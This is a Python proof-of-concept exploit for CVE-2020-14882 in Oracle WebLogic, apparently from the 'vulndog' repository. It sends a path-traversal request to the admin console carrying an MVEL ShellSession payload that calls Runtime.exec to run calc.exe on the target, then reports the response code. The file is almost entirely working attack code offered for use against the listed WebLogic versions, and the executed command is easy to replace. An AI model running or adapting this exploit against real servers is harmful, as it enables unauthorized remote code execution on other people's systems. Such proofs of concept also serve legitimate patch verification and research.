import requests
import sys
import time

if len(sys.argv)!=2:
    print('+-------------------------------------------------------------------------------------------------------+')
    print('+ DES: By bgbing as https://github.com/bgbing/vulndog                                                   +')
    print('+      Vuln Name: CVE-2020-14882 | WebLogic 12.2.1.4                                                    +')
    print('+                                                                                                       +')
    print('+-------------------------------------------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url>                                                                         +')
    print('+ EXP: python3 weblogic-12.2.1.4_rce.py http://1.1.1.1:8080                                             +')
    print('+ VER: Oracle Weblogic Server 10.3.6.0.0                                                                +')
    print('+      Oracle Weblogic Server 12.1.3.0.0                                                                +')
    print('+      Oracle Weblogic Server 12.2.1.3.0                                                                +')
    print('+      Oracle Weblogic Server 12.2.1.4.0                                                                +')
    print('+      Oracle Weblogic Server 14.1.1.0.0                                                                +')
    print('+-------------------------------------------------------------------------------------------------------+')
    sys.exit()
    
url=sys.argv[1]+"/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)"
header={
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Cookie":"ADMINCONSOLESESSION=oz9zj-pQ0RS3h_Z2ZZ-HPUvS8f4Bal_ykFA3pcg_vJLBgwBP2bP1!2145697388; wp-settings-time-1=1601959792; JSESSIONID=iedzd4-y34Xmgc9Ws4JP8NiWdbUDmrt3BbDSY9MKX1hOmVaP6JYC!2145697388"}
response=requests.get(url,headers=header)
first=response.status_code
status=str(first)
print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" "+"正在发起请求...")
print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+" "+"返回响应状态码"+" "+status)
print("命令已执行，无回显")

